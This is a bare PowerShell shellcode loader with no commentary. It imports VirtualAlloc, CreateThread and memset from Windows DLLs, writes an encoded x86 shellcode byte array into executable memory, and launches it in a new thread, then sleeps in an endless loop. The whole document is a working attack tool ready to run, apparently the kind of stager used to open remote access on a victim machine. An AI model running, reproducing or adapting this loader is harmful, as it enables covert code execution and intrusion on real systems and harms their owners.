
$WBY = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $WBY -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x49,0xa1,0xeb,0x39,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x58,0x13,0x03,0x58,0x13,0x83,0xe8,0xb5,0x43,0x1e,0xc5,0xad,0x06,0xe1,0x36,0x2d,0x67,0x6b,0xd3,0x1c,0xa7,0x0f,0x97,0x0e,0x17,0x5b,0xf5,0xa2,0xdc,0x09,0xee,0x31,0x90,0x85,0x01,0xf2,0x1f,0xf0,0x2c,0x03,0x33,0xc0,0x2f,0x87,0x4e,0x15,0x90,0xb6,0x80,0x68,0xd1,0xff,0xfd,0x81,0x83,0xa8,0x8a,0x34,0x34,0xdd,0xc7,0x84,0xbf,0xad,0xc6,0x8c,0x5c,0x65,0xe8,0xbd,0xf2,0xfe,0xb3,0x1d,0xf4,0xd3,0xcf,0x17,0xee,0x30,0xf5,0xee,0x85,0x82,0x81,0xf0,0x4f,0xdb,0x6a,0x5e,0xae,0xd4,0x98,0x9e,0xf6,0xd2,0x42,0xd5,0x0e,0x21,0xfe,0xee,0xd4,0x58,0x24,0x7a,0xcf,0xfa,0xaf,0xdc,0x2b,0xfb,0x7c,0xba,0xb8,0xf7,0xc9,0xc8,0xe7,0x1b,0xcf,0x1d,0x9c,0x27,0x44,0xa0,0x73,0xae,0x1e,0x87,0x57,0xeb,0xc5,0xa6,0xce,0x51,0xab,0xd7,0x11,0x3a,0x14,0x72,0x59,0xd6,0x41,0x0f,0x00,0xbe,0xa6,0x22,0xbb,0x3e,0xa1,0x35,0xc8,0x0c,0x6e,0xee,0x46,0x3c,0xe7,0x28,0x90,0x43,0xd2,0x8d,0x0e,0xba,0xdd,0xed,0x07,0x78,0x89,0xbd,0x3f,0xa9,0xb2,0x55,0xc0,0x56,0x67,0xc3,0xc5,0xc0,0x82,0x1d,0xc7,0x91,0xfb,0x1f,0xc7,0x91,0xab,0x96,0x21,0xc1,0x1b,0xf9,0xfd,0xa1,0xcb,0xb9,0xad,0x49,0x06,0x36,0x91,0x69,0x29,0x9c,0xba,0x03,0xc6,0x49,0x92,0xbb,0x7f,0xd0,0x68,0x5a,0x7f,0xce,0x14,0x5c,0x0b,0xfd,0xe9,0x12,0xfc,0x88,0xf9,0xc2,0x0c,0xc7,0xa0,0x44,0x12,0xfd,0xcf,0x68,0x86,0xfa,0x59,0x3f,0x3e,0x01,0xbf,0x77,0xe1,0xfa,0xea,0x0c,0x28,0x6f,0x55,0x7a,0x55,0x7f,0x55,0x7a,0x03,0x15,0x55,0x12,0xf3,0x4d,0x06,0x07,0xfc,0x5b,0x3a,0x94,0x69,0x64,0x6b,0x49,0x39,0x0c,0x91,0xb4,0x0d,0x93,0x6a,0x93,0x8f,0xef,0xbc,0xdd,0xe5,0x01,0x7d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ecA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ecA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ecA,0,0,0);for (;;){Start-sleep 60};

